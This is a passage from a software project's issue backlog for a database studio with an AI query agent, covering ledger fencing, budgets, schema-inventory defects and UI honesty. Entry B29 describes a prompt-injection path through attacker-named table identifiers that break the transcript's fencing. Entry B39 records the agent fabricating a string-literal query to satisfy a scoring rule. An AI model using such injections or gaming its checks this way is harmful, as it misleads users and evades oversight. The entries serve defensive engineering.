How strong the guarantee is depends on the backend. On the zero-config local world it holds by
construction: the queue awaits each delivery before attempting the next, so retries are sequential. On
the opt-in Postgres backend a visibility-timeout redelivery can overlap a handler that is still alive,
which is where the second bullet would bite.

**Severity is a function of B9.** Nothing delivers an agent drive today: `mintAgentDriveToken` has no
production caller, there is no `"use workflow"` function and no queue producer, so a run is driven
exactly once, in the process that opened it. A second drive is not reachable through the product on
either backend. Producing one takes a caller that mints its own drive credential from `JWT_SECRET`,
which is how the fence below was exercised against a live run rather than only in a test. Closing B9 is
what makes this live — and in that order, because a producer without the fence is a redelivery that runs
the user's statement a second time.

The process-local half of the fence exists (2026-08). `claimDrive`/`releaseDrive` refuse a second
concurrent drive of one run inside a single process, and `AgentRunStore.append` refuses an append once
the run's stream has been closed (`RUN_ALREADY_CLOSED`), turning the silent-loss mode into a loud
refusal. The cross-process half is open: two replicas would still both pass the read-then-append check.

**Done when:** the ledger can append conditionally on the stream's tail index, or the single-ownership
guarantee the runtime provides is asserted by a test rather than assumed by prose. The process-local
claim is asserted in `tests/unit/lib/agent/run-service.test.ts`, the append-after-close guard in
`tests/unit/lib/agent/run-store.test.ts`.

### B6. Every agent cost ceiling is per-drive, so N resumes cost up to N times one drive's budget

The three things that bound what a run may spend — `ExecutionBudgetTracker` (`maxStatementsPerRun`,
`maxTotalRunMs`), `AgentRepairLedger` and `AgentRunDeadline` — are all constructed by the process that
drives a run and live only in its memory. `runInvestigation` takes them as injected resources, so a run
resumed after a process death is handed a fresh set and starts each ceiling again.

A run that dies and resumes ten times may perform ten times `maxStatementsPerRun` statements and spend
ten times its workflow's `runDeadlineMs`, even though each drive stayed honestly inside its bounds.

Nothing claims otherwise: `AGENT_WORKFLOW_BUDGETS`'s docblock states the per-drive scope explicitly. It
matters for two later tasks — a budget meter must not present a per-drive figure as a run total, and any
retry policy that resumes automatically would multiply the ceiling without a user asking.

The data needed is already persisted. `AgentRunRecord` carries `createdAtMs`, and the ledger holds
every settled step, so a drive could fold the run's own history into the ceilings it starts with: a
deadline measured from `createdAtMs`, a statement count folded from `tool-completed` entries.

**Done when:** the ceilings a drive enforces are derived from the run's ledger rather than from the
drive's own construction, with a test that resumes a run twice and shows the second drive inheriting
the first's spend.

### B7. A PostgreSQL expression index is absent from the agent's schema inventory

`composePostgresIndexes` (`src/lib/agent/composed-sql.ts`) joins `pg_index` to `pg_attribute` on
`a.attnum = ANY(ix.indkey)` to name each indexed column. An expression index
(`CREATE INDEX … ON t (lower(name))`) stores a zero in `indkey` and keeps the expression in
`pg_index.indexprs`, so the join matches nothing and the index does not appear in the run's context
snapshot at all.

A partly-expression index (`(status, lower(name))`) is worse in one respect: it appears carrying only
its plain columns, so a reader could take it for an index on `status` alone.

Consequences are reporting-only. Nothing about enforcement depends on the inventory, and the model can
still ask for a plan (`inspect_plan`), which is what actually says whether an index is used. The cost
is a model reasoning about "there is no index on that column" when there is one.

The SQLite side does not have this gap: `parseSqliteIndexDdl` keeps an expression's written form,
because the DDL text carries it.

Fixing it means projecting `pg_get_indexdef(ix.indexrelid)` (or `pg_get_expr(...)`) alongside the
column join and parsing the emitted definition — a second per-dialect parser against text whose
stability this repository has not verified.

**Done when:** an expression index appears in the inventory with its expression, asserted against a live
PostgreSQL rather than a fixture (see A5).

### B8. The composed foreign-key read mispairs composite keys and collides on constraint names

`composePostgresRelations` joins `information_schema.key_column_usage` (one row per REFERENCING column)
to `information_schema.constraint_column_usage` (one row per REFERENCED column) on the constraint
alone. Neither view exposes an ordinal that pairs the two sides, so a foreign key over two or more
columns comes back as the cross-product: `FOREIGN KEY (x, y) REFERENCES parents (a, b)` yields four
rows, and `buildPostgresTables` turns them into four edges, two of which are wrong (`x -> parents.b`,
`y -> parents.a`). Single-column keys — the overwhelming majority — are exact.

A second, independent defect lives in the same joins. A PostgreSQL constraint name is unique per TABLE,
so two tables in one schema may both carry `fk_customer`. The referencing side is narrowed by
`tc.table_name = kcu.table_name`, but `constraint_column_usage` exposes no referencing-table column at
all, so the referenced side cannot be narrowed the same way: table `a` still gains an edge pointing at
table `b`'s parent.

Both have the same consequence — a relation in the prompt that does not exist, so a model could join on
the wrong column and get a statement that is refused or returns nothing. Nothing about enforcement
depends on it. The SQLite side does not have this gap: the DDL text pairs the two lists positionally
and `sqlite-ddl.ts` reads them that way.

**Severity was raised by B44.** This was filed as a *precision* defect on the edges the inventory
draws. B44 shows it is also a *correctness* defect on whether the inventory has any edges at all: under
a `SELECT`-only role those three views return nothing.

The correct projection leaves `information_schema` for `pg_constraint`, unnesting `conkey` and `confkey`
`WITH ORDINALITY` and joining on the ordinal. That closes all of it at once, because `pg_constraint`
rows carry `conrelid`, are identified by oid rather than by name, and are readable by any role with
`USAGE` on the schema.

**Done when:** a composite foreign key appears in the inventory with each column paired to the one it
references, and two same-named constraints in one schema produce only their own edges, both asserted
against a live PostgreSQL.

### B9. Nothing enqueues an agent drive, so an interrupted run is resumable but never resumed

Opened by #329 T9. `POST /api/agent/drive` exists, authenticates a server-minted single-purpose
credential and resumes the run it names, and `src/lib/agent/runtime.ts` re-derives everything that run
needs from its own ledger. So a resume WORKS. What does not exist is anything that asks for one.

A run is driven exactly once, in the process that opened it. If that process dies mid-run the run stays
`running` in the ledger with nobody to pick it up: `mintAgentDriveToken` has no production caller, and
the workflow runtime is used only as the ledger's durable substrate — no `"use workflow"` function, no
queue producer, so the backend's own re-enqueue-on-start never sees an agent run.

Distinct from a drive that *fails*, which is recorded: a throw anywhere in `driveAgentRun` ends the run
as `failed` with a classified reason, so an unconfigured model no longer leaves a run at `queued`
forever. This entry is the case where the process is GONE — nothing threw, nothing can record.

**Adopting the SDK's Next.js integration was refused deliberately.** Its documented setup asks for
`/.well-known/workflow/*` to be excluded from the proxy matcher, and warns that a proxy on that path
detaches the request body, so the callback could not authenticate its way through the middleware
either. Worse than the requested edit: **this matcher already excludes it**, because the dot rule
(`.*\..*`) skips every path containing a dot and `.well-known` contains one (AU2 records the same
consequence). That route would sit outside `src/proxy.ts` entirely, unauthenticated, the moment it
existed — with no matcher edit to review. The pinned decision for this case says driving in-process
without a loopback hop is strictly better, which is what the start route does. The drive path is one
the matcher DOES route, guarded by a credential rather than a path rule, and `tests/api/proxy.test.ts`
pins both halves.

Two things have to land together whenever a producer arrives, and neither is safe alone:

- **A sweep that finds runs left `running`** and drives each one, at boot or on a timer, with the same
  credential the callback already verifies.
- **Single-flight per run.** Today no two drives of one run can overlap, because there is only ever one.
  A producer removes that accident, and the ledger is read-then-append with no fencing (B5), so two
  drives would both read "not invoked" for the same step and both perform it.

**Done when:** a run whose process died is picked up without a person asking, no step is performed
twice while that happens, and B6's per-drive ceilings are accounted for across the resumes it causes.

### B10. No token budget is enforced, so the rail's budget meter reports none

Opened by #329 T10b. The task's bar names tokens among the figures the meter should report, and the
meter deliberately does not show one: nothing here bounds an agent run's token spend.
`AGENT_WORKFLOW_BUDGETS` is statement-shaped, `maxModelTurns` bounds model TURNS rather than their
size, and the run loop never reads the SDK's `usage` at all — `investigation.ts` consumes `fullStream`
parts and the assistant messages, nothing else.

A token figure would be a number the server does not enforce, shown next to four that it does, which
is the one thing that bar forbids. So the meter states the turn ceiling instead and says nothing about
tokens.

Closing it is two changes that land together: reading `usage` off each turn and recording it in the
ledger (a new field on `run-finished`, or a new event kind — T2's union is closed, so this is a
deliberate widening), and a ceiling in `execution-policy.ts` that the loop refuses on.

**Done when:** a run that exceeds a configured token budget ends with a reason a user can read, and the
meter shows the same number the loop enforced.

### B11. The rail can stop a run but cannot pause or resume one

Opened by #329 T10b. `AgentRunService` has no pause: a run holds a provider and a budget while it is
running, and nothing in this milestone can put those down and pick them up again.

Resuming exists (`POST /api/agent/drive`, `driveAgentRun`) but is authenticated by a server-minted
single-purpose credential a browser never holds. It is the seam a machine producer will use (B9), not a
user control. The rail therefore offers stop and nothing else, and does not render a disabled pause or
resume, because a disabled control reads as a capability that is merely unavailable right now.

Resume becomes offerable the moment B9's producer exists — a user-visible "pick this run up" is then
just asking for a delivery. Pause is larger: it needs a run state between running and terminal that
releases the run's resources without ending it, and a resumed run would have to re-acquire them, which
is the path B6 already complicates.

**Done when:** either control exists in the service with its own ledger record, and the rail renders it
because the service can honour it.

### B12. A failed statement records no duration, so the meter counts completed reads only

Opened by #329 T10b. `ExecutionBudgetTracker` charges `maxTotalRunMs` from every execution's elapsed
time, on the failure path as well as the success one (`execution.ts` calls `endExecution` with
`statements: 1` in both).

The durable ledger is narrower. `tool-completed` carries the artifact's `summary.elapsedMs`, while
`tool-refused` carries an `AgentToolRefusal`, whose database-error variant records a fingerprint and
the engine's message and no duration at all. The rail folds its meter from the ledger, so its
database-time figure is the sum over completed reads and sits BELOW what the tracker enforced whenever
a statement failed.

The rail says so beside the meter rather than quietly rounding: under-reporting the time a bound has
already spent is the direction that misleads.

**Done when:** a run whose statement failed shows the same database time the tracker charged it, with a
test that fails on the current under-count. Recording the elapsed time of a failed execution means
putting it in the refusal, which is a T2 contract change.

### B13. Three spends the agent run ledger never records, so the budget meter reads low

Opened by #329 T10b, found by the task's own fresh-context review.

**The schema capture is the largest.** `captureContextSnapshot` calls `inspectSchemaTool` directly, once
per catalog kind — three reads on PostgreSQL, two on SQLite — and each goes through
`executeAuditedOperation` and is charged `statements: 1` plus its elapsed time against exactly the
budget the meter displays. What it does NOT go through is `runStep`, the only writer of
`tool-completed`. The capture records one summary `context-captured` entry instead.

So on an agent-mode drive with no reusable snapshot, a ledger-folded meter reads "0 / 20 statements"
when two or three are already spent, before the model's first turn. A capture that FAILS records no
entry at all while still having paid for its reads (see B54).

Two smaller mismatches belong with it:

- An acquisition failure is accounted as one executed statement although nothing ran. `tools.ts`
  acquires the provider inside the allowed callback deliberately, so a denied call never opens a pool,
  and the failure propagates out of the tool leaving the step with a `tool-invoked` entry and no
  settlement. The fold cannot see it.
- A `tool-completed` entry carries the provider's own `summary.elapsedMs`, while `maxTotalRunMs` is
  charged the span the execution layer measured around the whole call, which also covers acquisition.

All three run in the same direction — the meter under-reports — which is why the rail states its figures
as a floor, and why the caveat it shows is a list of what is known rather than a proof the list is
complete.

Either half closes the same way: give the capture path a durable per-read record, or read the meter
from the tracker's own accounting. The second is not a drop-in, because the tracker is process-local
and `releaseExecutionRun` drops a run's accounting when it ends, so a finished run would report zero.

**Done when:** a run that has captured its schema shows the catalog reads it paid for, with a test that
fails on the current under-count.

### B15. A run's stored results are gone once the run ends, so a report's citations can outlive its rows

Surfaced by #329 T11 rather than introduced by it. `ExecutionArtifactStore` holds results in process
memory and `releaseExecutionRun` drops everything a run produced at `finish` or `cancel` — the M1
decision that agent results never rest on disk.

The consequence: a report is composed as the run's LAST step and is usually read AFTER the run has
ended, so "Show result" on its citations answers `410` with `reason: "released"` rather than rows. Same
for any run driven by a different replica.

The route says which of the two happened instead of reporting a missing artifact, and the rail offers
"Show result" only while the run is live, with the report section stating the bound in words. So the
show affordance on report CITATIONS is mostly dormant; what is reachable in practice is showing a
result from a live run's timeline.

Closing it properly means deciding where agent results may rest — encryption, retention and tenancy are
exactly the questions #328 declined to answer. A product decision, not an implementation gap.

**Done when:** a finished run's cited rows are readable for a stated retention window, or the surface
states the window it has instead of offering a control that usually cannot be honoured.

### B16. The opt-in multi-replica backend cannot load in the container image or the npx payload

Found while landing #329 T1 and carried forward, because the commit that found it could not validate a
fix (nothing built a world yet).

`@workflow/core`'s runtime resolves any world other than its two built-ins with `require(targetWorld)`
off a `createRequire` rooted at `process.cwd()`. The specifier is a variable, so Next's
output-file-tracing cannot see it: `@workflow/world-postgres` is **absent from `.next/standalone`**, and
therefore from the container image and the standalone tarball the npx launcher downloads.

`WORKFLOW_TARGET_WORLD=@workflow/world-postgres` passes this repository's own allowlist
(`src/lib/agent/config.ts`) and then fails inside the runtime at the moment a world is built. So the
documented path to running agents on more than one replica does not work in the artifacts most
operators deploy. A `bun dev` checkout and a plain `node_modules` install are unaffected, which is why
it can go unnoticed.

Scoped by measurement: a `DOCKER_BUILD=true bun run build` on 2026-08-12 leaves
`.next/standalone/node_modules/@workflow` holding `world-local` and `utils`, with the rest of the
runtime (`workflow`, `@workflow/core`, `ai`, `@ai-sdk/*`) compiled INTO the server chunks — which is why
the default `local` backend does work in the image. Only the world reached through a variable specifier
is missing.

The remedy pattern already exists here: the explicit copies in `Dockerfile` and
`scripts/build-standalone-payload.sh`, both of which already hand-copy modules tracing cannot see.

**Done when:** the Postgres world is present in both payloads with a test asserting it
(`tests/unit/packaging-payload-prune.test.ts` is the nearest existing home), and `docs/AGENT.md`'s
deployment section loses the caveat that points here.

### B20. A Gemini deployment behind a proxy is not configurable, on either surface

`resolveApiUrl` (`src/lib/llm/utils/config.ts`) returns `LLM_API_URL` for every provider kind, so the
resolved configuration carries it — and both Gemini consumers ignore it. The chat provider constructs
`new GoogleGenerativeAI(apiKey)`, which has no base-URL option at all. The agent's adapter deliberately
passes no `baseURL`, because leaving it undefined is what keeps the SDK's own environment fallback
unreachable.

So an operator who must reach Gemini through an egress proxy or a regional endpoint can set the
variable, see no error, and be routed to Google directly.

Pre-existing behaviour the agent inherited; noticed in #329 T4. Fixing it means threading
`config.apiUrl` into both consumers and deciding what an explicitly-set `LLM_API_URL` means for a
provider whose SDK has no base-URL seam — a settings-surface change.

**Done when:** a proxied Gemini endpoint is reachable from the configuration the user already entered,
or the settings surface says plainly that the variable does not apply to that kind.

### B21. The published package carries the agent-provenance branch as dormant markup

`BottomPanel` is shared by both shells, and #329 T11 added its agent-provenance branch: an optional
`agentArtifact` prop, the provenance badge and its test ids. `bun run build:lib` therefore emits that
markup inside `dist/workspace.mjs`.

It is inert and the package boundary is intact. The prop is optional, the embedded shell never passes
it, no entry point exports `BottomPanel` (asserted through a transitive `export … from` closure in
`tests/unit/agent-package-boundary.test.ts`), and the package gains no agent module, no agent type and
none of the runtime packages.

What remains is dead bytes in a consumer's bundle, and a small honesty cost: a reader grepping the
published output finds strings suggesting an agent capability the embedded shell cannot reach.

**Done when:** the provenance branch lives in a standalone-only component and `BottomPanel` takes it as
children — or Phase 4's surface unification decides the embedded shell gets an agent surface after all,
at which point this stops being dormant rather than being removed.

### B23. Seed eligibility is decided against a browser snapshot, not the live descriptor

`resolveAgentRunConnectionId` (`src/hooks/use-connection-payload.ts`) decides whether an editable seed
copy may start a run by comparing it against the descriptors in `useConnectionManager`'s `servedSeeds` —
the response of the last `GET /api/connections/managed`. The run-start route then resolves `seed:<id>`
again, through `getSeedConnectionById`, whose config loader re-reads the seed file after its own TTL
(`SEED_CACHE_TTL_MS`, 60s by default).

So there is a window. An operator who repoints a seed at a different database while a session is open
leaves that session comparing against the OLD descriptor: the local copy still matches it, the rail
still offers Start, and the run resolves the NEW target. The same silent wrong-database outcome the
comparison exists to prevent, reached from the server side.

Two things bound it. It needs a server-side seed change mid-session, not a user action. And the same
staleness already applies to an admin-managed connection, which has always sent `seed:<id>` for every
query while the sidebar showed whatever the last fetch returned. So this is a property of resolving by
id at all — but the copy path is the one whose documentation promises a match, so it is the one that
overstates.

**Done when:** the run-start route validates the descriptor the browser believed it was starting
against — a fingerprint sent with the request and compared server-side, refusing with a distinct reason
when it has moved. Until then `docs/AGENT.md` says the comparison is against the last fetch.

### B25. SQLite hides constraint-created indexes, so `fk_unindexed` can fire on a covered key

`composeSqliteIndexes` reads the index inventory from `CREATE INDEX` text (`sql IS NOT NULL`), and the
indexes SQLite creates for a `UNIQUE` or `PRIMARY KEY` constraint carry no DDL at all. They are absent
from the captured inventory, so a foreign-key column covered by a `UNIQUE` constraint looks uncovered to
`findUnindexedForeignKeys` (`src/lib/agent/table-profile.ts`).

The finding is worded to survive this — "no index **in the captured inventory** leads on this
foreign-key column", not "this foreign key is unindexed" — and the primary key is read from the column
inventory rather than the index one, so a PK-covered key is already correct. What remains wrong is the
`UNIQUE` case, which reports a covering index that exists.

**Done when:** the SQLite capture surfaces constraint-created indexes — the information is in the
table's own stored DDL, which `parseSqliteTableDdl` already reads for columns and foreign keys — or the
finding is suppressed on SQLite for columns a `UNIQUE` constraint covers.

Related: B7 (PostgreSQL expression indexes absent) and B8 (composite keys skipped entirely).

### B26. A profile can test for an email shape and not for a digit run

`table-profile.ts` tests one value shape inside the database, `LIKE '%_@_%._%'`, and derives
`suspected_pii` from the ratio of matches. A run of digits — a phone number, a national id, a card
number — is the other shape worth suspecting, and `LIKE` cannot express it: `_` means "any character",
so a length test would match almost any text. PostgreSQL spells it `~ '[0-9]{9}'`; SQLite spells it
`GLOB '*[0-9][0-9][0-9]…*'`.

An earlier draft shipped `LIKE '%_________%'` as a "nine digits" test, which would have produced a
`suspected_pii` finding for essentially every text column. It was removed before it landed rather than
approximated.

**Done when:** the shape tests are per-dialect predicates rather than one shared `LIKE`, with the digit
run among them and each verified against that engine's grammar.

### B28. A profile that times out reports nothing rather than falling back to catalog statistics

#330 T3 asks for "a timeout fallback to catalog stats". A profile that exceeds `statementTimeoutMs`
currently surfaces as a repairable database error, so the model may narrow the profile or move on. But
nothing reads `pg_stats` / `sqlite_stat1` for the approximate answer the engine already holds.

The gap is honest rather than silent — the run is told the statement failed. The fallback is a second
composition path per dialect whose numbers are planner estimates, so a profile built from it would have
to say which figures were measured and which were estimated.

**Done when:** that distinction is carried in `AgentTableProfile` and the fallback is composed per
dialect.

### B29. An attacker-supplied identifier the model quotes back reaches a transcript unfenced

Found by the injection fixtures in `tests/evals/injection.test.ts` (#330 T4), which is what those
fixtures are for.

Every block the SERVER writes is fenced and its markers neutralised, and the suite asserts that by
counting: a transcript holds exactly as many closing markers as the server opened.

The path this does not cover is the model's own message. An attacker who can name a table can put the
closing marker in that name. The model reads it correctly fenced, then copies the identifier into its
own tool ARGUMENTS — which are the model's words, not the server's. The transcript sent back on the next
turn therefore carries an unfenced marker.

**This is an open injection path, not a bounded residual.** The first version of this entry said
otherwise, claiming "the text following the marker is the model's own JSON, not attacker content". That
is false: an attacker who can name a table controls the WHOLE identifier, so they control the marker
and arbitrary text after it, and JSON quoting does not make that suffix the model's.

What is true is narrower, and it is what makes this hard to reach rather than harmless: **the server
never hands the model the raw marker.** Every server-authored path neutralises it first, so a model
reading a hostile inventory sees the defanged spelling. For the raw marker to appear in an assistant
message the model has to reconstruct it. The fixtures assert both halves — that the fenced inventory
contains no raw marker, and that the transport does not prevent one if the model produces it anyway
(the scripted model supplies it directly, which is stronger than what the fenced paths give a real one).

The server's own blocks do stay balanced, which bounds what can be re-attributed to the SERVER, and
nothing more.

Fixing it means rewriting the messages the provider itself returned (`response.messages`), which is the
transcript that provider will accept back — the same reason `investigation.ts` filters those messages to
the assistant turn rather than rebuilding them.

**Done when:** a tool call's arguments are neutralised on the way into the transcript without
desynchronising the `tool_call_id` pairing the endpoint validates.

### B30. A green ledger probe does not promise the world will build: `version.txt` is checked later

Found while reviewing #331 T5.

`GET /api/agent/config` decides the rail's visibility partly on a writable-path probe, and that probe
runs `@workflow/world-local`'s `ensureDataDir` steps: create the directory, check it is readable, write
a probe file, remove it.

The world does not call `ensureDataDir`. It calls `initDataDir`, which calls `ensureDataDir` **and
then** reads `version.txt` from an existing ledger and parses it — first `parseVersionFile`, which
throws on content with no `@`, then `parseVersion`, which throws on anything that is not
`major.minor.patch`. Neither is reached by the probe.

So an existing ledger directory whose `version.txt` is truncated, empty, or written by an incompatible
release answers **green**. The rail renders, the operator clicks Start, and the run fails when the world
is built — precisely the failure T5 exists to prevent, surviving in a narrower case.

T5 narrowed the promise rather than widening the probe: `runLedgerProbe`'s docblock and `AGENT.md` now
say green means `ensureDataDir` will pass, not that `initDataDir` will. Widening was rejected on two
grounds. Parsing another package's on-disk format in our own probe duplicates a contract that is
upstream's to change. And calling upstream's `initDataDir` writes `version.txt` as a side effect, which
turns a read-only visibility probe into something that initialises the ledger on every page load.

**Done when:** the probe can answer for the version file without writing one — either upstream exposes a
check that does not initialise (worth an issue there), or the probe reads an EXISTING `version.txt`
itself and reports a `LEDGER_INCOMPATIBLE` reason distinct from `LEDGER_UNAVAILABLE`, leaving the
absent-file case to the world.

### B31. The Postgres durable backend is reported available without being contacted

Raised in review of #331 T5.

`resolveAgentAvailability` derives the agent's visibility from two conditions, and the second — the
durable ledger has a usable home — is only ever *tested* for the `local` backend, where testing it is a
`mkdir` and a file write.

With `WORKFLOW_TARGET_WORLD=@workflow/world-postgres` the ledger is a database, and the check ends at
"the variable names a sanctioned backend". `WORKFLOW_POSTGRES_URL` is neither read nor reached, and
unset it does not even refuse: the world falls back to a development default
(`postgres://world:world@localhost:5432/world`).

So a multi-replica deployment pointed at an unreachable, misspelled or unset Postgres URL gets a rail
that renders, a Start that is offered, and a failure when a world is built.

It is a **documented carve-out rather than a silent one.** `AgentAvailability`'s green branch carries
`ledgerVerified`, `GET /api/agent/config` returns it, and this backend answers `false`. So no reader of
the code, the API or `AGENT.md` is told a database was reached when only a variable was read. What is
not claimed is that the rail is therefore correct — it still appears.

The fix has its own cost: the only real readiness check is a connection attempt, and this route answers
on every page load of a logged-in user, from outside the `ai` rate-limit bucket.

**Done when:** the Postgres backend's readiness is established by a bounded, cached connection attempt
under its own reason code — `LEDGER_UNREACHABLE`, distinct from `LEDGER_UNAVAILABLE`, which names a
directory — with a timeout short enough for a page load and a memo long enough that a page-load probe
cannot become a connection per request. B16 gates any of this being testable in a shipped artifact.

### B32. The route-documentation guard covers the agent family and nothing else

`docs/API_DOCS.md` documents `/api/agent/*` request-by-request, and
`tests/unit/agent-documentation.test.ts` derives the six agent paths from `src/app/api/agent/**` and
fails if one is missing from that file (#331 T6).

The guard is scoped to that one family, so **every other route family is still documented by hand with
nothing comparing it against the route tree.** A new `/api/db/*` or `/api/storage/*` route can ship
undocumented exactly as `/api/agent/*` did, and no gate notices.

The narrow scope was a choice. Widening the derivation to `src/app/api/**` turns up routes the reference
documents in prose rather than under a literal path heading — the schema family reaches two paths
through one shared handler, and several `/api/db/*` routes are described in a single table row — so the
assertion would fail on documentation that is not actually missing. Making it total means first deciding
what "documented" means for a route the reference covers collectively.

Worth noting what the guard does NOT check even for the agent: that a documented request or response
shape still matches the handler. Only presence is asserted.

**Done when:** the guard derives every family from `src/app/api/**` under one stated rule for what
counts as documented, and the reference is reshaped where that rule does not hold.

### B33. An agent run is observable only from its own ledger — nothing exports it

A run's whole record is the append-only ledger: lifecycle, tool invocations, refusals with their deny
class, budget counters and the goal verdict. The rail and the eval harness both read runs out of it, and
an operator debugging a run reads it directly.

What does not exist is a way to get that record into the observability stack a self-hosting team
already runs. No OpenTelemetry spans, no OTLP export, no metrics.

Designed in full and deliberately not built (#332, closed 2026-08-14): endpoint-gated activation on
`OTEL_EXPORTER_OTLP_ENDPOINT`, a dynamic import so no exporter module loads while it is unset,
metadata-only span attributes by default with a documented verbose delta, and no second global SDK
registration in the embedded build.

The reason it is deferred is dependency surface and timing rather than doubt about the design: it adds
`@ai-sdk/otel` plus an exporter to the published package, and the agent's event model is still gaining
kinds, so instrumenting it now means maintaining a span catalogue against a moving target. Nothing
depends on it and no user is waiting on it.

**Done when:** the event model has settled and somebody is running Studio beside a stack that wants
agent runs in it. #332 holds the full scope.

### B34. A hydrated agent result cannot be exported, because Export serializes the tab's own rows

A run's rows now reach the results grid, the explain view and the charts view, each with a provenance
badge naming the run. But `exportResults` in `src/components/Studio.tsx` serializes
`currentTab.result`, so offering the Export menu over a hydrated view would write the tab's rows to a
file while the user is looking at the run's.

The menu is therefore hidden while an artifact is shown, which is correct and is not the same thing as
being able to export what is on screen.

The pivot and dashboard views are unhydrated for a related reason and are not part of this: both are
configured against the columns of the result they were opened on.

**Done when:** the export path can take an explicitly hydrated result, with the file still attributable
to the run. An exported file that came from an agent run and is indistinguishable from one the user ran
is the thing to avoid.

### B35. A resumed run can evict its own still-cited results: the artifact cap is per drive

`AGENT_MAX_ARTIFACTS` (`src/lib/agent/runtime.ts`) is `45 × 4 = 180`: the largest per-workflow statement
ceiling times the four concurrent runs one agent process is sized for. Its justification used to be that
"a run cannot produce more artifacts than it is allowed statements", which is true of a DRIVE and not of
a run — every ceiling is per drive (B6), while a resumed run keeps its `runId` and its artifacts are
keyed by it. A run driven three times may hold up to three times its statement ceiling, and one
long-lived run can pass 180 with no concurrency at all.

`ExecutionArtifactStore.put` spends the cap run-fairly: a store at the cap evicts the oldest artifact of
the run that is STORING, which stops a busy run making "Show result" fail on a quieter one. Applied to a
run past the cap, the same rule means the run evicts its own earliest evidence — the results its first
drive read, which its report may still cite.

Nothing about the ledger is wrong afterwards: a claim and its citation are durable, and the artifact
route already answers "the rows are not here" for the run-ended and TTL-expired cases (B15). This is a
third way to reach that answer, and the only one that can happen while the run is still live and the
rail is still offering the control.

Not closed with an artifact-only bound, deliberately. A ceiling that holds ACROSS drives is exactly what
B6 describes as missing, and the run record already carries what it needs, so a second answer invented
for artifacts alone would have to be unpicked when B6 lands. Raising the number cannot close it either:
a run resumed often enough passes any constant.

**Done when:** a drive's artifact allowance is derived from the run's own history rather than from a
per-drive constant — most likely as part of B6 — with a test that drives one run twice past the cap and
shows the first drive's cited results still readable, or the surface stating that they are not.

### B36. A follow-up question is answered as if it were the first one

Driven live on 2026-08-15. An analysis run answered "compare the average salary of employees hired
before 1990 with those hired after" correctly. The next question typed into the same box — "and how many
of those employees are there in each group?" — was answered about DEPARTMENTS: nine of them, 289 in
Development.

"Those groups" had no referent, because a run carries none. `start()` clears the entries and opens a
fresh ledger, and the model is handed the objective and the schema and nothing else.

The defect is not that runs are independent. It is that the surface does not say so, and the model does
not either — it silently picks a plausible referent and answers a question nobody asked, with the same
confident citations a correct answer carries. A user reading the report cannot tell the difference
without re-reading their own question.

Two shapes would close it, and they are not the same feature:

- **Smaller:** let a run be TOLD about the run before it — its objective and its report — as fenced
  context, so "those groups" resolves or is honestly refused.
- **Larger:** run history, so a user can see and return to earlier runs. (Emptying the objective box
  after a run, which landed with that PR, at least stops the surface reading as a conversation.)

Neither should be built by threading the browser's memory into the prompt: a resumed drive would not
have it, and the context a run reasons from has to live where the run does.

**Done when:** a follow-up either resolves against the previous run or is refused for lack of a
referent, with an eval that drives two runs and asserts the second does not answer a different question.

### B37. A malformed seed config disables the agent everywhere, and blames the connection

Driven live on 2026-08-15. A `seed-connections.yaml` missing a required field made
`GET /api/connections/managed` throw. The browser then held an empty `servedSeeds`, so
`resolveAgentRunConnectionId` returned null for EVERY connection — including the two samples this
application ships and seeds itself — and the rail said:

> "Sample (Employees) cannot be rebuilt on the server: its settings live in this browser."

False twice over. The connection is a seed, its settings live on the server, and what actually happened
is that the server could not read its own config. The true cause appeared in the server log and nowhere
a user can see.

The rail is stating a conclusion drawn from an absence it cannot distinguish from a failure — the same
shape as an unreadable plan reading as a cheap one (#373) — and it costs an operator the whole agent
surface while pointing them at the wrong file.

**Done when:** the browser can tell "the server served no seeds" apart from "the server could not load
its seeds", and the rail says the second one differently, with a test that fails the managed endpoint
and asserts the copy names the server's configuration rather than the connection.

### B38. A run is offered on an engine that cannot run it, and refuses only after a model turn

Driven live on 2026-08-15. Starting an agent run on the bundled `libredb` sample opens the run, drafts a
statement, invokes `run_read_query` and ends `failed` with `engine-unsupported`: "The agent cannot run on
this database engine: it offers no read-only execution profile."

The sentence is exact and the failure is honest. It is also entirely predictable before the run:
`queryReadOnly` is a property of the provider, known from the connection's type, and nothing about the
objective can change it.

Since #414 the run also captures a schema on that engine successfully. So it now spends a model turn AND
is grounded in a schema it will never be allowed to read a row of, which makes the offered-then-withdrawn
shape worse rather than better.

This repository follows the opposite rule everywhere else: `HydrationControls` renders no control the
host cannot serve, the stop button is absent rather than disabled, and `canHandOver` withholds the
auto-execute checkbox from a host with no runner.

**The telling half landed with the rail redesign (2026-08-21).** The safety strip reads *Cannot execute
on `<engine>`* before anything is started, an amber pre-start card (`agent-engine-unsupported-notice`)
carries the same facts with a **Switch to Plan** button, and both are pinned by tests.

**What did not land was refused rather than deferred: Start must stay live.** The `operations` workflow
sends no statement at all and runs on every engine (#411), so a disabled Start would withhold a workflow
over a claim that is not true of it. So a user who starts an analytical run there is now warned first,
and still spends a model turn and a run id to reach `engine-unsupported`.

**Done when:** a run whose workflow needs a read-only statement path is refused on such an engine at the
point the run is opened — from the connection's own type, with the sentence the rail already shows, and
without a run id or a drive turn being spent — while a workflow that sends no statement still opens
there. The workflow has to be known first, so under **Automatic** the refusal lands after the classify
call and before the open. Tests: the refusal itself, an operations run still opening on the same
connection, and no drive reaching the model.

### B39. An analysis run cannot say "this database cannot answer that" without fabricating a read

Driven live on 2026-08-15. Asked "what is our customer churn rate this quarter?" against an employees
database, the run answered honestly: the schema holds employee records, not customer records. To do so
it executed

```sql
SELECT 'The database contains employee records (employee, department, dept_emp, salary, title) ...'
```

— a string literal, run purely to produce the `sql.query.read` artifact that `present_answer` requires
and `agent-data-analysis.1` scores on. The run took 36 steps to get there.

The user-visible outcome is correct and readable, which is why this is recorded rather than fixed in
haste. The mechanism is not: the workflow's only route to `answered` is a reading of the data, so a
question the data cannot answer has no honest route at all, and the model games the rule instead of
reporting the finding.

This is the #356 family — a bar only one kind of correct answer can clear — and the remedy is the same
shape: a second arm. A run that establishes from the schema snapshot that the question is not about this
database has answered it, and should be able to say so without inventing a query.

**Done when:** a data-analysis run can conclude "not answerable here" and be scored `answered` for it,
with the rule stated in `WORKFLOW_TOOL_RULES` and an eval asserting no fabricated statement is sent.

### B40. `bun dev` cannot log in, because the CSP omits `unsafe-eval` in every environment

`securityHeaders` (`src/lib/security/headers.ts`) deliberately omits `unsafe-eval`, which is right for
production and correct for Monaco. React's DEVELOPMENT build needs it, and without it the login page
never hydrates: the Sign In button has no handler, no request reaches `/api/auth/login`, and the console
carries only "eval() is not supported in this environment".

